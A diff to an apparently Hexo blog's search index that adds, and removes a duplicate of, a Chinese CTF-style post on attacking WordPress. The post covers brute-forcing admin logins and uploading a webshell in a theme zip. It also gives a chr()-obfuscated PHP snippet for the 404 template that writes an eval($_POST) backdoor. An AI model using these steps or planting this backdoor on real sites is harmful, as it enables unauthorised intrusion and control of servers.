@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>Worldpress基础利用</title>
+      <link href="/2020/06/03/Worldpress%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/"/>
+      <url>/2020/06/03/Worldpress%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<p>worldpress是一款主流的博客系统，但是关于它的漏洞也层出不穷。<br>这次是因为一次CTF靶场遇到此类情况，顺便做个简单记录。</p><p>worldpress系统本身比较安全，但是因为它可以自定义插件，很多时候因为插件作者安全开发的能力有高有低，导致许多安全漏洞的出现。</p><h2 id="0x01-弱口令"><a href="#0x01-弱口令" class="headerlink" title="0x01 弱口令"></a>0x01 弱口令</h2><p>后台默认地址为：<code>xxxx/wp-admin/</code></p><p>没有验证码可以暴力破解，常见用户名admin,worldpress,system等。</p><p>进入后台后的利用：</p><p>1 上传主题包getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机建立目录“upkn”,把一句话1.php放进去。打包upkn目录为zip文件。WP后台的主题管理，上传主题，安装。则你的后门路径为：</span><br><span class="line">wp-content&#x2F;themes&#x2F;upkn&#x2F;1.php。</span><br></pre></td></tr></table></figure><p>2 修改主题文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">“外观”-“编辑”-“404模板</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;fputs(fopen(chr(46).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112),w),chr(60).chr(63).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(97).chr(93).chr(41).chr(59).chr(63).chr(62));&lt;&#x2F;script&gt;</span><br><span class="line">插到文件头</span><br><span class="line">点404模板的时候地址栏有相对路径，默认是wp-content&#x2F;themes&#x2F;twentyten&#x2F;404.php</span><br><span class="line">更新完直接访问localhost&#x2F;wp-content&#x2F;themes&#x2F;twentyten&#x2F;404.php就会在twentyten目录生成一句话后门a.php 密码a</span><br></pre></td></tr></table></figure><h2 id="0x02-插件漏洞利用"><a href="#0x02-插件漏洞利用" class="headerlink" title="0x02 插件漏洞利用"></a>0x02 插件漏洞利用</h2><p>插件漏洞类型很多，例如xss,sql注入，rce等。</p><p>推荐工具方便自查：<a href="https://github.com/wpscanteam/wpscan" target="_blank" rel="noopener">https://github.com/wpscanteam/wpscan</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>搜索工具Everything 配置不当导致信息泄漏</title>
       <link href="/2020/06/03/%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7Everything-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/"/>
       <url>/2020/06/03/%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7Everything-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/</url>
@@ -112,31 +131,6 @@
           
       </categories>
       
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Worldpress常规利用思路</title>
-      <link href="/2020/06/01/Worldpress%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/"/>
-      <url>/2020/06/01/Worldpress%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/</url>
-      
-        <content type="html"><![CDATA[<p>worldpress是一款主流的博客系统，但是关于它的漏洞也层出不穷。<br>这次是因为一次CTF靶场遇到此类情况，顺便做个简单记录。</p><p>worldpress系统本身比较安全，但是因为它可以自定义插件，很多时候因为插件作者安全开发的能力有高有低，导致许多安全漏洞的出现。</p><h2 id="0x01-弱口令"><a href="#0x01-弱口令" class="headerlink" title="0x01 弱口令"></a>0x01 弱口令</h2><p>后台默认地址为：<code>xxxx/wp-admin/</code></p><p>没有验证码可以暴力破解，常见用户名admin,worldpress,system等。</p><p>进入后台后的利用：</p><p>1 上传主题包getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机建立目录“upkn”,把一句话1.php放进去。打包upkn目录为zip文件。WP后台的主题管理，上传主题，安装。则你的后门路径为：</span><br><span class="line">wp-content&#x2F;themes&#x2F;upkn&#x2F;1.php。</span><br></pre></td></tr></table></figure><p>2 修改主题文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">“外观”-“编辑”-“404模板</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;fputs(fopen(chr(46).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112),w),chr(60).chr(63).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(97).chr(93).chr(41).chr(59).chr(63).chr(62));&lt;&#x2F;script&gt;</span><br><span class="line">插到文件头</span><br><span class="line">点404模板的时候地址栏有相对路径，默认是wp-content&#x2F;themes&#x2F;twentyten&#x2F;404.php</span><br><span class="line">更新完直接访问localhost&#x2F;wp-content&#x2F;themes&#x2F;twentyten&#x2F;404.php就会在twentyten目录生成一句话后门a.php 密码a</span><br></pre></td></tr></table></figure><h2 id="0x02-插件漏洞利用"><a href="#0x02-插件漏洞利用" class="headerlink" title="0x02 插件漏洞利用"></a>0x02 插件漏洞利用</h2><p>插件漏洞类型很多，例如xss,sql注入，rce等。</p><p>推荐工具方便自查：<a href="https://github.com/wpscanteam/wpscan" target="_blank" rel="noopener">https://github.com/wpscanteam/wpscan</a></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 测试 </tag>
-            
-        </tags>
       
     </entry>
     
